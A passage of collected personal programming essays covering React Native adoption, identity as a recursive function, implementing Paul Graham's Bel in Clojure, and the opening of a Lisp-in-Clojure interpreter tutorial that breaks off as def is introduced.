to sync data with HealthKit and Google Fit --- how the heck would do
that without Native? And what about notifications?

The stack of feature ideas piled up until we were forced to consider
Native again.

### Discord

Wanting to make our app great, remembering the pain of mobile
development, and considering the inonvenience of having to write both
iOS and Andorid weighed on my mind.

During one reflection I remembered something: wait, Discord was built on
React Native.

It's no todo app. Thousands of users hang around in channels, send their
emojis, and it all *feels native.* The most painful worry for me was the
tarpit of a "thousand papercuts", forcing me to chuck a whole app. But
it looked like Discord hadn't hit this tarpit. What if I was wrong?

I forked up a fresh React Native app, and began to experiment with
Consistent on mobile.

### Hot Reloading

The first breath of fresh air came with React Native's development
experience. Seeing a change on mobile come alive within a blink, felt so
good that I couldn't help but tell people about it. My parents, who live
in a village in Eastern Europe heard the shpiel. At parties in New York,
I would nudge conversation away from techno music and onto iterative
development.

With just hot reloading, you get back the experience of of coding by
discovery and exploration, and this can change your engineering velocity
by a magnitude.

### Code Push

It got better. Both iOS and Android allow you to ship changes to
interpreted languages (that means Javascript) without any review
process. This means that you can ship updates to your React Native app
instantly!

You get back ownership for your deploys. I can still viscerally remember
the feeling I had when our app was insta-crashing, but I knew we could
be saved with Code Push.

When you *know* you can fix a bug instantly, you both program more
aggressively and sleep better at night --- and that too changes your
engineering velocity.

### Two Platforms

And to my astonishment, it *actually* delivered the promise of single
codebase shipping across platforms. I didn't believe this would be
possible. I imagined a hodgepodge of edge cases would divide the app,
officially stamped as "cross- platform", in the same way that the Soviet
Union's newspaper was called "Pravda".

The primitives just work well across platforms. After 3 months of app
development, I searched our codebase, to see we only have 5 if
statements, which check specifically for the platform the app is running
on.

I think it's inarguable to say that being able to ship seamlessly on two
platforms at least halves your engineering time. But, I think it's a
bigger win than that. If a single engineer gets to work on both
platforms, they only need to gain context once. There's fewer changes of
errors, and the app is more consistent to boot.

### A Fundamental Abstraction

But, what about that abstraction cost? Would we find ourselves having to
debug esoteric object-oriented issues with text inputs?

Well, I'd argue that with hot reloading, code push, and cross-platform
support, you'd have to debug years of esotertic bugs to pay down the
win. But, the risk for catastrophe is lower in React Native.

I dug deeper into how it worked, and I was astounded. It was beautiful.

Their concepts are fundamental: just two threads, with React figuring
out what to do, and sending those instructions over a Native bridge. You
can build their layout engine yourself.

It made me realize that this was no framework, but a fundamental
abstraction: more similar to an interpreter than an MVC framework.

### An Interpreter for UI

And if an abstraction is like an interpreter, you get some serious wins.

When the abstraction is conceptually simple, you need fewer people to
maintain it. For example, just a few folks tend to maintain powerful
programming languages. Similarly, React Native is conceptually simple
enough that if Facebook were to dump the whole project, I'm confident a
few folks could maintain it.

A powerful abstraction pushes complexity down. Just a few hundred lines
of an interpereter can run hundreds of thousands of lines of programs.
Similarily, hunderds of thousands of lines of UI gets handled by React
Native's platform. This means that when you come across an issue, you
can solve it at a platform level: instead of your product engineers
worrying about performance for example, a few platform engineers can
worry and solve it for everyone.

My experience at Facebook showed me constantly the benefit of pushing
complexity down in this way. For example, we did this for privacy.
Facebook had a slew of issues for "which user can see what data".
Product engineers had to constantly worry about this when writing UI.

To solve this, some FB engineers built "ViewerContexts". These handy
things made it impossible to fetch data a viewer wasn't allowed to see.
All the complexity for privacy was pushed down to this new abstraction,
and product engineers didn't have to worry about it. You get to do this
for hard problems in your UI development.

### A Grand Tradition

We're inundated with astronaut frameworks: projects that promise to
change the way we think about programming and make life a leasiurely
stroll in a flower garden, but fail after you get past a todo app.

This means we're right to be wary when we hear big promises: after all a
fundamental abstraction in how we program is less likely to come up,
compared to a loudly touted astronaut framework.

Yet, fundamental abstractions *do* come around. We're not writing in
assembly, or worrying about TCP after all. We work on
abstraction-over-abstraction-over- abstraction all day long.

Each abstraciton can help us move a mangitude faster, so you can imagine
the opportunity ahead i you can spot one. I think React has proven to be
an instance of such an abstraction. You can tell by how conceptually
simple the fundamental ideas are, and how it redefines the way you solve
problems. React Native builds beautifully on top of it.

We're 3 months into our product at this point. Have we found estoteric
issues? Yes. Many an hour I have spent learning about the intricate
relationship between ScrollViews, KeyboardAvodingViews, and TextInputs.
But, was it worth it? The development speed, and the core concepts we
get to use have changed how we develop applications on mobile. We're
betting our product on it.

### Two caveats

I would heartily recommend React Native at this point, but would make
two suggestion.

First: *do not be afraid of native.* If you can, build a purely Native
app on iOS and Android to learn. In order to move quickly, I believe you
need to understand at least one level below the abstraction that you
use. Time will come when indeed you must go outside of React Native ---
whether it's because no library does the right job, or you need to move
off some work from Native. If you know iOS and Android, you'll be
fearless about it.

Second: *embrace delightful UX.* Mobile apps are a gold standard for
delightful user experience. It's a different paradigm and if you're
coming purely from web, there's a lot to learn. Discord has proven that
you can make a delightful app on React Native, but it won't happen by
accident. Things that you may have not even gotten to on web --- like
animations --- you'll want to prioritize highly on mobile. Alex
Koliarskyi has a great talk \[4\] on this.

With those two caveats, you're off to the races.

*Thanks Alex Kotliarskyi, Daniel Woelfel, Jacky Wang, Joe Averbukh, Phil
Nachum, Sean Grove for reviewing drafts of this essay*

# Siren Calls and Compasses

How do we develop our identity? I subscribe to Hofstaedter's theory
\[1\]. Paraphrased it's like this:

As newborns we're blissfully unaware of any distinction between
ourselves and our surroundings. We identify those distinctions, by
searching for the fundamental patterns that guide our reality.

We must learn the concept of *limbs* for example: that we can control
our own *hands* , and that we can't control other people's hands. Soon
we identify *humans*. From there maybe *mom* and *dad*.

We find ecstasy and disappointment through our various attempts at
manipulating our environment. As we accumulate a store of patterns, we
can combine them and form even more complex patterns.

Say a few years go by, and you're playing with a toy. It breaks, so you
peer over to investigate. Your mom sees this and says "You're a born
engineer". A germ of a pattern begins to form. There's of course *you*
and *born engineer.* Perhaps your dad repeats this, a few more events go
by, and you realize " *I'm a born engineer* ". One more pattern in the
store.

Put all the patterns together, and you get *you*. I find Hofstaedter's
idea mathematically beautiful. You can define yourself as a recursive
function:

\[code\]

    You(T) = IntegrateExperience(You(T-1), Experience(T)) 
    You(0) = YourInherentPersonality

\[/code\]

Every experience reflects onto and evolves your brain, contributing to
the tapestry of identity that is you.

Now, there's a lot to split hairs about in this definition. For example,
it doesn't much allow for free will. I could waive this away, by the
defense that `IntegrateExperience` has so many dimensions that it
amounts to free will. But, this essay isn't really about Hofstaedter's
theory. It's about one specific externality.

I want to put forth the idea that we define our sense of self largely by
how other people interact with us.

Yes, for all intents and purposes there's free will, and yes, your
inherent disposition plays a big role, and yes, it's complicated, but if
you reflect on your own experience, I think you'll agree that what other
people think has played a large role in developing your identity.

### Siren Calls

Now, if that's true, what are the downstream consequences?

As you get smarter, you no longer have to wait for others to give you
direct hints at who you are. Instead, you can see what society values
and chase after it.

It starts easy. Perhaps you see what people say about smart kids, and
you want that identity. You strive to become a top student in your
school. Then, you try to go to the best University. And from there,
depending on your environment, you either *join the best firm* , or
*strike out on your own*.

At each point, you're inundated with pattern after pattern. For example,
say you *strike out on your own*. You notice that the most ambitious
people are working on *climate change.* So you mimic their airs and
begin your journey to save the world. But a few months in, and now, all
the talk is about wildfires in California. Before you have time to
pivot, it's all about *remote first*. Wait what about *Web3* , and don't
forget *Machine Learning*.

To make things worse, society's pull isn't uniform. With the macro pull
(society), there are also just-as-strong micro pulls (individual). You
could kick off your climate change journey for example, but your parents
may think you're wasting your time. Oops. If identity was what you were
after, suddenly the plan loses it's luster. Contending with different
pulls that change every three months...even if you get everything right
you're on brittle foundations.

### Ends

The story I painted for you is extreme. It's easy to make fun of the
hypothetical actor and remove ourselves from it. After all, our brains
are very good at convincing ourselves that "Actually, pivoting into
wildfires in California is exactly what I wanted to do from the start".
But apply some humility, and I think you'll see parts of yourself.

Where does it all lead? Let the siren calls guide you, and you risk
wasting away your life. Even if you win this game, you've lost. Who are
you really if you have never formed an opinion that's your own? If you
flit and follow the tidal waves of society, can anyone really trust you?
Can you even trust yourself?

I think we seldom wake up from siren calls like this until it's too
late. Maybe the "mid-life crisis" is such a moment for many. But even
then, why does just about everyone collect sports cars and romantic
flings? Just one more siren call of society.

If you're like me, the idea that you're part of the tidal wave makes you
bristle with emotion. A life of ups and downs, at the whims of the
opinion of the many. I don't think I can think of anything more
cowardly.

Yet, what is the alternative. Could you define your sense of self as
separate from any interaction with the outside world? Can you really be
uncaring for what other people think?

From all I can gather, I don't think so. You are inexorably linked with
your connections with others. To revolt against it is to revolt against
your humanity, to become a malfunctioning robot.

But I don't think hope is lost. The very fact that we bristle with
emotion gives us a clue. If we can't change the equation, perhaps we can
use it to our advantage, as our compass.

### Experience(T)

The reason we bristle, I think, is that we have seen a path to a
different kind of identity.

After all, we don't tend to admire the person who flits between flowers.
We admire the hero who is unwavering with their principles. The person
who tells the truth even when it hurts. The person who lifts up and
supports those around them.

Where do these ideas come from? These ideas too come from society, but
from a much more timeless place.

Our world is fantastically multi-dimensional, and thanks to the power of
words, our wisdom transcends time. In the same way that you can pick up
the identity that you are a "Wealthy, Type-A achiever" from your Twitter
personality du-jour, you can pick up the idea that you are "A person who
never lies", from the fiction of Rafael Sabatini, or a "someone who is
unfazed by the whims of fortune" from the writings of Seneca.

And hence one of our points of most severe leverage. We must influence
the `Experience` that we feed our identity.

Society tends to drive us towards the superficial, but this is only true
on average. Our world is filled with wisdom, with archetypes that
demonstrates what truly matters. Values like honor, chivalry,
righteousness, caring for the weak, sacrifice for the collective, are
exemplified throughout the annals of history.

How do you know some of these "identities" are worth taking on? One clue
is time. If you find yourself inspired by the behavior of someone in the
4th Century, they're likely doing something right.

But you can't just get lost in books. In the same way that you can learn
to value Dom Perignon and clubbing, you can value calling your family
and doing what's right. Your choice of living heroes, and your choice of
friendships, are an overwhelming factor.

When you see your friend devote a 3 hour call with their uncle, or craft
a special birthday experience for a loved one, you put into perspective
what matters and what doesn't.

### IntegrateExperience(You, Experience)

So, given the multi-dimensional nature of our reality, we can *choose*
the Experiences that lead us to timeless identities. But, this is not
enough. After all, `Experience` is just input to `IntegrateExperience`.

This, is where the real test lies. Learning that something is good, is
different than doing what is good. Doing has a cost to it. Say you went
through a tough experience: maybe you lost a bunch of money for example.
How do you handle it? You've seen the examples of the heroes, but how
will you behave?

Every difficult action done well, is proof towards a timeless identity.
If you follow the logic of our `You` function, you're literally changing
yourself by the action.

### Grandma's Wisdom

And really, what does the conclusion come to? We come to the idea, that
a good life is forged from fundamental, timeless values: honor,
erudition, and truth. To overcome the inertia of society, be careful
about what you consume, choose your friends wisely, and train yourself
to make the hard decisions when they come, for they are what transform
you.

I think many a grandparent in my home country would tell you the same
thing. Perhaps that is one further proof to the soundness of these
principles --- this idea itself is tested by time. I hope this essay
serves as an inspiring `Experience(T)` for you, as it has been for me in
writing it 🙂

*Thanks to Alex Reichert, Joe Averbukh, Jacky Wang for reviewing drafts
of this essay.*

# Bel in Clojure

9 months ago, I took a gander at PG's [guide to
Bel](http://www.paulgraham.com/bel.html). If you haven't read it, here's
the premise:

In 1958 when McCarthy invented Lisp, he started with a mathematical,
rather than a practical definition. His paper was more similar to the
spec for a Turing Machine than a spec for Fortran. For example, McCarthy
didn't even think that Lisp would run on real computers until his
graduate student suggested it.

This was the secret to Lisp's power. Because McCarthy was unconcerned
with how Lisp would work on the computers of 1958, he made a language so
powerful that it's still magic for the computers of 2021.

The original spec for Lisp stopped short of a complete language. There
were no numbers or errors for example. So PG thought: what would happen
if I continued McCarthy's tradition, and formally defined a *complete*
language? Numbers, errors, and all.

This idea spoke to my Lisper heart, and I was intrigued. I opened up the
guide and got reading. An hour in, and I knew I needed to get my hands
dirty to really understand this. So I told myself, hey, why don't I just
take a weekend and implement the spec?

Well\...9 months later, I present you Bel in Clojure!

![](https://stopa.io/api/image/firstFrame/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE0ODI2MTc1MC1hMzVkZmIxNC0zMDg1LTQ0OGQtOGQxNi00NTFjMGU0OGU4ZjcuZ2lm)

It's still rough, and about 85% there, but it's \~tolerably fast for
small functions, and even supports multi-threading! Want to try it
yourself? [Here's the code](https://github.com/stopachka/bel-clojure).

## The Journey

Working on Bel felt like going on a country walk, and running into an
old friend who suggests skydiving. You think to yourself, sure a bit out
of the ordinary but why not, skydiving is fun. As soon as you step on
the plane, you discover the pilot is an intrepid adventurer and offers
you a glide over London. Well, you wouldn't have predicted this, but you
did always want to visit London. After your plane lands, you run into a
person who speaks to your soul. You blink, and find yourself on a
scooter over a dirt road in Thailand, driving off into the sunset with
the love of your life.

Okay this may be a bit too much for a paragraph in a technical essay.
What do I mean?

### EBNF

My first plan was a 2-day project: I would use Clojure's reader, keep
Clojure data structures, and write a standard recursive interpreter ---
no more than a few hundred lines probably.

And there came my first surprise. I couldn't use Clojure's reader. PG
supports quasiquotes (\``(foo ',a ,@b)`) custom characters (`\bel`),
dotted lists (`(a . b)`), and a powerful shorthand syntax (`x|~f:g!a`
typechecks, composes 3 functions, quotes and invokes). I realized I'd
need to write my own parser \[1\].

Thankfully, I discovered
[instaparse](https://github.com/Engelberg/instaparse), and EBNF
notation. EBNF, if you haven't heard of it, is a declarative way to
describe programming language syntax. Years have made me suspicious of
purported "declarative DSLs" --- often a hodpodge of incidental
complexity. But, my friends EBNF joins SQL in my eyes as a real
solution.

### Continuations

So, with the parser out of the way, I marched forward with confidence.
One more weekend, and I'd surely be done. Oops, I hit another surprise:
my simple recursive interpreter wouldn't work.

PG supports continuations. Continuations let you "move back" to
different points in your program's execution. (If you haven't heard of
them, no worries, I'll describe them in more detail later in the essay).
What this meant for me, was that I couldn't just have a simple
interpreter that recursed over itself, as I'd need to be able to "go
back" to states in the recursion.

Now I saw one more weekend wouldn't do the trick, and took a break.

### SICP to the rescue?

A few months later, I got back to the project, but this time opened up
my trusty guide: Structure and Interpretation of Computer Programs. I
perused their chapter on the [amb
intepreter](https://mitpress.mit.edu/sites/default/files/sicp/full-%20text/book/book-Z-H-28.html),
and saw how they used the "continuation-passing- style". Yes, this could
do the trick.

Okay, off I went, and re-implemented my interpreter in the continuation-
passing-style. If you haven't heard of it, here's the idea: every step,
instead of returning, calls a "done" callback. This lets you save
callbacks and move between different states in the execution.

Once I made this refactor, continuations were easy peasy.

### -J-Xss900M

Well, very soon I came to the next setback. After just 100 or 200 lines
of reading the Bel source, running simple programs would cause my
interpreter to stack overflow. PG heavily takes advantage of recursion
in his code, which exacerbated my poor callback-based interpreter.

At first, I started raising the JVM stack size, hoping I could get
through. But, I was beginning to hit stack overflows even when I set the
stack size to 900 megabytes. \[2\] To make matters worse, writing an
interpreter with continuation-passing-style is a nightmare to debug and
reason about. Here's an example of [one
function](https://github.com/stopachka/bel-%20clojure/blob/22f72f6fcae25dff5b725e33104537ab4c588c55/src/bel_clojure/instance.clj#L519-L550)
--- this kind of recursion makes my head spin.

So, off on another break I went.

### Stacks

Then, I opened the project up a week ago. This time, I thought to
myself: why don't I implement my own call stack?

Keeping my own call stack (which is just how PG does it in the Bel
source), turned out to be the watershed moment. It was easier to debug,
and a bunch of the implementation became simpler. For example,
supporting multi-threading was only [\~50
lines](https://github.com/stopachka/bel-clojure/pull/19/files)!

At this point, I was emboldened. Much of Bel was working, but it was
slow. In the formal spirit, PG implements the environment as a list for
example. This meant every lookup was O(n). Numbers were also implemented
as lists, and just `+` would take too long to run. I was worried that if
my interpreter ran PG's source, it would be intolerably slow.

### Clojure Inspiration

So I thought to myself, why don't I try to make it faster? I loved
Clojure's design decisions, when it came to interop with java. Clojure
strings are java strings, clojure numbers are java numbers.

So, I went with that spirit. I leaked `java.util.HashMap` into Bel, and
used that as the environment. That was a huge speedup. After that, I
leaked java numbers, strings, and chars \[3\]. Bel began to take a
pragmatic shape.

### The Current State

At this point, the interpreter supports much of Bel, but has diverted
from the formal specification in a few ways. Numbers are Clojure
numbers, and Strings are a separate type. The most crucial missing
feature are streams: I think we'd want to seep Java streams, but I
haven't thought deeply about it yet.

It's still slow \[4\], and I'm certain there many bugs to overcome. But,
it's fun to use as a REPL 🙂

## Impressions

Implementing Bel has given me quite an appreciation for the source. Bel
is *powerful.* When defining the whole language in itself, the language
designer is forced to expose access to all the constructs they need, and
that means the user of the language is as powerful as the designer.

### lit

For example, PG introduces a new construct called `lit`. It's like a
persistent quote:

\[code\]

    (quote a)
    > a 
    (lit a) 
    > (lit a)

\[/code\]

Why would you need this? Well, if you're trying to define "primitive
types" in your language, like functions or numbers, you'd want them to
evaluate to themselves. So PG takes advantage of `lit` to do just this.
For example, here's how he represents functions:

\[code\]

    (lit clo nil (x) (+ x 1))

\[/code\]

Functions are lists, just like something the language user could write.
If you wanted to create your own primitive type --- say "keywords", it
would look conceptually similar:

\[code\]

    (lit kw foo)
    > (lit kw foo)

\[/code\]

### globe, scope

And how about closures? To support that, whenever a function is defined,
PG needs a way to "inject" the current lexical scope. So, he introduces
`globe` and `scope`: variables that expose the actual interpreter
environment. Now he can write something like this:

\[code\]

    (mac fn (params body)
      `(list 'lit 'clo scope ',params ',body))

\[/code\]

So when a `fn` is defined, it just generates a list, with the current
scope plopped inside:

\[code\]

    ((fn (y) (fn (x) (+ x y)) 1)
    > (lit clo {y 1} (x) (+ x y))

\[/code\]

I don't know of a different language that gives you access to the
environment in this way. It was pretty cool to see how simple it was to
define something like `fn`

### mac

I was also surprised with his macros. I traditionally thought macros ran
once during compile time. But his macros are "ever-present", and are
available at runtime. He defines a macro as a simple `lit` which keeps a
closure. This closure is run over the arguments it receives, before
they're evaluated.

\[code\]

    (lit mac (lit clo ...))

\[/code\]

This isn't unique to Bel, But I thought the way we could define
`defmacro`, was pretty cool:

\[code\]

    (set defmacro
      (lit mac
        (lit clo nil (n p e)
          (list 'set n
                (list 'lit 'mac
                      (list 'lit 'clo nil p e))))))

\[/code\]

This is a macro-defining macro!

### err

The "defining the language" thinking shows up with how PG specs out
errors. For example, he says that whenever there's an error, the
interpreter can't just give up. Instead, it must call the `err` function
with a message.

\[code\]

    (car 'a) ;; uh oh, this is an error, interpreter calls (err 'bad-arg)

\[/code\]

By making this axiom, it now lets PG control *how* errors happen. For
example, say we want to do something special with the `err` function. We
could do this:

\[code\]

    (dyn err (fn (x) 'hello) (car 'a))
    > hello

\[/code\]

Here, we redefined `err`, to a function that returns `'hello`. All of a
sudden, we have half of what we need to implement error catching.

### Continuations

The other half, comes from continuations. Before Bel I had heard of
continuations, but I never seriously used a language that supported
them. As I said before, continuations let you go to a certain point in a
program's execution.

To get a better sense of what I mean, let's look at an example PG uses
in his guide:

\[code\]

    (list 'a (ccc (fn (c) (set cont c) 'b)))
    > (a b)

\[/code\]

Here, we start a computation `(list 'a ...)`. This runs
`(ccc (fn () ...))` and returns the result `'b`, which completes
`(list 'a 'b)`, and returns `(a b)`.

But now watch this:

\[code\]

    (cont 'z)
    > (a z)
    (cont 'w)
    > (a w)

\[/code\]

The callback in `ccc` gave us `c`, a continuation. Whenever we call it,
it's as though we "went back" to when our interpreter was computing
`(list a ...)`, but this time instead of returning `'b` , we return
`'z`. We then do that again but with `'w`.

Why do we need it? Well, let's say you want to do some kind of error
catching. Here's how you could do it:

\[code\]

    (ccc (fn (c) 
            (dyn err (fn (x) (c 'uhohgotanerror))
              (car 'b))))
    > uhohgotanerror

\[/code\]

All of a sudden, you can implement a whole suite of cool macros, like
`eif`, `safe,` and `onerr`, with a [few lines of
code](https://github.com/stopachka/bel-%20clojure/blob/main/resources/core.bel#L250-L267):

\[code\]

    (onerr 'oops (car 'a))
    > 'oops

\[/code\]

At first I was skeptical with continuations, but one thing is clear:
they are a more *fundamental* abstraction than exceptions. You can
implement exceptions with continuations, but you can't implement
continuations with exceptions. If power is your priority, than they are
more powerful.

### Utilities

I'm not sure how much this is a consequence of writing a language in
itself, but I found a grab-bag of great functions and macros I hadn't
seen before in other languages. Here are some really fun ones.

The `eif` macro, returns one branch if there's an error:

\[code\]

    (eif x (car 'a)
            'oops
            x)
    > oops

\[/code\]

The `aif` macro, which evaluates the test expression, but lets you
access the result as the variable `it`:

\[code\]

    (map (fn (x)
            (aif (cdr x) (car it)))
      '((a) (b c) (d e f) (g)))
    > (nil c e nil)

\[/code\]

The `of` function, which applies one function to all arguments, and
gives those results to another one:

\[code\]

    ((of + car) x y z)
    ;; same as -> 
    (+ (car x) (car y) (car z))

\[/code\]

And `upon`, which lets you save arguments and apply them to different
functions:

\[code\]

    (map (upon '(a b c)) 
         (list car cadr cdr))
    > (a b (b c))

\[/code\]

### Abbreviations

Perhaps the most fun thing I saw, which I immediately wished was
available in clojure was the shorthand syntax:

For example, composition:

\[code\]

    foo:bar:baz
    ;; same as ->
    (compose foo bar baz)

\[/code\]

And whenver you need to get the "opposite" of a function:

\[code\]

    ~foo
    ;; same as ->
    (compose no foo)

\[/code\]

There's two really nice list creation abbreviations too:

\[code\]

    foo.a
    ;; same as ->
    (foo a)
    foo!a 
    ;; same as ->
    (foo 'a)

\[/code\]

This kind of stuff seems small and inconsequential, but it\'s
significant in practice. I think it may be because though it seems like
it\'s about saving keystrokes, it\'s actually about giving your mind a
shorthand to think with.

### My one big gripe

The one thing that made me hesitant, was the underlying pair primitive
in Bel. It's mutable. On one hand, I can understand the decision, as if
you're trying to answer "how can I formally define a complete
language?", I think immutability wouldn't be critical.

But, after immutability in Clojure, I'm convinced it's the way that we
should all be programming. It models [reality
better](https://www.youtube.com/watch?v=ScEPu1cs4l0), and it makes
concurrency a magnitude simpler \[5\].

Still, I'm not sure an implementation of Bel necessarily has to have
mutability as core to the language. It may be just as good to "seep"
clojure's Peristent Seq, atom, and make threads actual system threads.
We'd come to a pretty darn cool language.

### One Fun Experiment

Perhaps the most interesting meta lesson, is to approach projects with
naivete and play. If I had known this would have taken 3 different
interpreter implementations, I would have been more hesitant to have
started, but boy am I glad I did. I learned a lot. It's still a toy, and
there's still a lot of work to do, but the journey itself was worth it.

I suggest you try it out, and hey, if you want to take it further, the
source is out there 🙂.

*Thanks Alex Reichert, Alexandre Lebrun, Daniel Woelfel, Dennis Heihoff,
Joe Averbukh, Julien Odent, Martin Raison, Sean Grove for reviewing
drafts of this essay*

# LLisp: Lisp in Lisp

Last week I had a thought: "What's the simplest Lisp interpreter I could
write, which supports macros?\"

A weekend of Clojure hacking and some confusion later, a REPL was born.
In this essay, we'll go through the same journey and make our own Lisp
interpreter, which supports macros...in Clojure! Let's call it, LLisp: a
lisp in a lisp.

By the end, you'll write your own macros in your own darn programming
language! Let's get into it.

## Sketch

Okay, let's sketch out the basic idea behind what we need to do:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE1MDY1NTc1NC1lMTg0NmZlNC0yM2I3LTQ3ZTctYjJmNy1lMjJiMDJlZmU2NmQucG5n)

A programmer writes some code. So far, it's just text, and there's not
much we can do with that. We *read* the programmer's text, and convert
it into data- structures. We can do something with data-structures: we
can *evaluate* data- structures, and return whatever the programmer
intended.

If we can convert `"(+ 1 1)"` into `2`, we have ourselves the roots of a
programming language.

## Reader

Let's handle "2. Read". If a programmer writes text like `"(+ 1 1)"`, we
want to convert it to data-structures. Something like:

\[code\]

    (read-string "(+ 1 1)")
    ; =>
    (+ 1 1)

\[/code\]

We *could* write `read-string` ourselves. For the simplest case it's
pretty easy \[1\]. But, we're in Clojure after all, and Clojure already
understands how to read Lisp code. Let's just cheat and use Clojure's
`edn`:

\[code\]

    (ns simple-lisp.core
      (:refer-clojure :exclude [eval read read-string])
      (:require [clojure.edn :refer [read read-string]]))

\[/code\]

And voila, `read-string` does what we want:

\[code\]

    (read-string "(+ 1 1)")
    ; =>
    (+ 1 1)

\[/code\]

## Evaluation

Okay, now to "3. Evaluate". Remember, our goal is to take
data-structures, evaluate \*\*them and return whatever the programmer
intended. We can begin with a simple function like this:

\[code\]

    (defn eval [form] 
      ;; TODO 
      )

\[/code\]

### Evaluating Literals

Let's get the easy things out of the way. Some things just evaluate to
themselves: if a programmer wrote `12` for example, all we'd have to do
is to return the number `12`. This is the same for strings (`"foo"`),
characters (`\b`), and booleans (`true`). They're literals *.*

Here's how we can evaluate literals. Let's detect them first:

\[code\]

    (def literal?
      (some-fn string? number? boolean? char? nil?))

\[/code\]

If you haven't seen `some-fn` before, this is one of clojure's many
[handy and powerful](https://clojuredocs.org/clojure.core/some-fn)
utilities. Now we can handle literals in `eval`:

\[code\]

    (defn eval [form]
      (cond
        (literal? form) form))

\[/code\]

And boom, our programming language starts to do something:

\[code\]

    (eval (read-string "12"))
    ; => 12

\[/code\]

### Introducing Quote

Let's get to `quote`. Quote is a crucial form in Lisp. It lets you write
code that *does not* evaluate. For example:

\[code\]

    (quote (+ 1 1))
    ; => 
    (+ 1 1)

\[/code\]

Because `(+ 1 1)` was inside `quote`, we didn't evaluate it to return
`2`. Instead we returned the expression itself. This seems weird if you
come from languages that don't support quotes, but it's used all the
time in Lisp. In fact, there's a shortcut for it:

\[code\]

    '(+ 1 1) 

\[/code\]

When this is read, it converts to

\[code\]

    (quote (+ 1 1))

\[/code\]

Thankfully, edn's `read-string` does this for us. 🙂

### Evaluating Quote

So, how do we *evaluate* quote? Let's first create a function that can
detect them:

\[code\]

    (defn seq-starts-with? [starts-with form]
      (and (seqable? form) (= (first form) starts-with)))

    (def quote? (partial seq-starts-with? 'quote))

\[/code\]

We see if our form is a list, and the first element is the symbol
`quote`

\[code\]

    (quote? (read-string "'(+ 1 1)"))
    ; => 
    true

\[/code\]

Works like a charm. Now let's update `eval`:

\[code\]

    (defn eval [form]
      (cond
        (literal? form) form
        (quote? form) (second form)))

\[/code\]

If our form is a `quote`, we return the "second" part of it. And voila,

\[code\]

    (eval (read-string "(quote (+ 1 1))"))
    ; => (+ 1 1)

\[/code\]

### Introducing Symbols

Next, we come to symbols. Symbols are a special Lisp data type. They're
like variables, in the sense that when we *evaluate a* symbol *,* we
\*\*look it up.

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0LzE1MDY1NTc2MS01YmQ2ODhlOS00ZDEzLTQ3ZjMtYTg4My1lYTZhMTdlYWRjNjEucG5n)

Look it up where? Our interpreter will need some kind of `environment`,
that keeps track of all the variables we defined. If we had an
environment, where the symbol `fav-num` pointed to `41` for example,
here's what evaluating `fav- num` would look like:

\[code\]

    (eval env (read-string "fav-num"))
    ; => 
    41

\[/code\]

### Evaluating Symbols

Let's first create this `environment`. We can use java's `Hashmap` to
keep a mapping of symbols to their values.

Let's import java's Hashmap:

\[code\]

    (ns simple-lisp.core
      (:refer-clojure :exclude [eval read read-string])
      (:require [clojure.edn :refer [read read-string]])
      (:import (java.util HashMap)))

\[/code\]

And make a quick function to create an `env` map:

\[code\]

    (defn env [] {:globe (HashMap. {'fav-num 41})})

\[/code\]

Now, we can accept an `env` map in `eval`, and start to handle symbols:

\[code\]

    (defn eval [env form]
      (cond
        (literal? form) form
        (quote? form) (second form)
        (symbol? form) (lookup-symbol env form)))

\[/code\]

Clojure already has a handy `symbol?` function, which we can use. When
that's true, we'll `lookup-symbol`. Here's how `lookup-symbol` could
look:

\[code\]

    (defn lookup-symbol [{:keys [globe]} sym]
      (let [v (when (contains? globe sym) [(get globe sym)])]
        (assert v (format "expected value for sym = %s" sym))
        (first v)))

\[/code\]

And with that, symbols work!

\[code\]

    (eval (env) (read-string "fav-num"))
    ; => 
    41

\[/code\]

### Evaluation Primitives

Next up, let's take an important step to making `(+ 1 1)` work. We'll
want to have `+` mean something. What should the symbol `+` point too?

How about Clojure functions?

\[code\]

    (defn env [] {:globe (HashMap. {'+ + 'fav-num 41})})

\[/code\]

If we did that, now whenever we evaluate the symbol `+`, it would return
a clojure function:

\[code\]

    (eval (env) (read-string "+"))
    ; => #object[clojure.core$_PLUS_ 0x4efcb4b5 "[[email protected]](/cdn-cgi/l/email-protection)"]

\[/code\]

And if we "received" a clojure function in eval, we can just treat it as
a literal:

\[code\]

    (def literal?
      (some-fn string? number? boolean? char? nil? fn?))

\[/code\]

\[code\]

    (eval (env) +)
    ; => #object[clojure.core$_PLUS_ 0x4efcb4b5 "[[email protected]](/cdn-cgi/l/email-protection)"]

\[/code\]

This is one small step in our essay, but a giant step for our Lisp.
Every element in `(+ 1 1)` can now be evaluated.

### Primitive Applications

So how do we run these functions? Well, let's update `eval` , to handle
lists like `(+ 1 1)`:

\[code\]

    (defn eval [env form]
      (cond
        (literal? form) form
        (quote? form) (second form)
        (symbol? form) (lookup-symbol env form)
        :else (eval-application env form)))

\[/code\]

Easy. If we *can't* figure out what the `form` is, it *must* be list,
and it must mean we want to run it! Here's how `eval-application` could
work:

\[code\]

    (defn eval-application [env [f & args]]
      (let [f-evaled (eval env f)]
        (cond
          (fn? f-evaled) (apply f-evaled (eval-many env args)))))

\[/code\]

In `eval-application` , we evaluate the *first* part of our list. In our
example, this would be the symbol `+`, which would return a clojure
function.

If `f-evaled` is a clojure function (which it is), we would run:

\[code\]

    (apply f-evaled (eval-many env args))

\[/code\]

`eval-many` is just a helper to evaluate a list of forms:

\[code\]

    (defn eval-many [e forms] (map (partial eval e) forms))

\[/code\]

`args` would be `(1 1)`, so `eval-many` would return `(1 1)`, and that
means we'd get the equivalent of:

\[code\]

    (apply + '(1 1))

\[/code\]

That would return `2`, and babam, we have `(+ 1 1)` working!

\[code\]

    (eval (env) (read-string "(+ 1 1)")
    ; => 
    2

\[/code\]

Remember, we evaluate recursively, so we can do some intricate stuff
already:

\[code\]

    (eval (env) (read-string "(+ 1 (+ 1 fav-num))")
    ; => 
    43

\[/code\]

### Introducing def

Oky doke, we have an environment, we got symbols that can look stuff up
in that environment, and we can even evaluate `(+ 1 (+ 1 fav-num))`.

But, how are we going to *define* variables? For example, let's say we
wanted to have the symbol `second-fav` point to `42`.

Well, we can introduce a special form. Something like this:

\[code\]

    (def second-fav (+ 1 fav-num))

\[/code\]

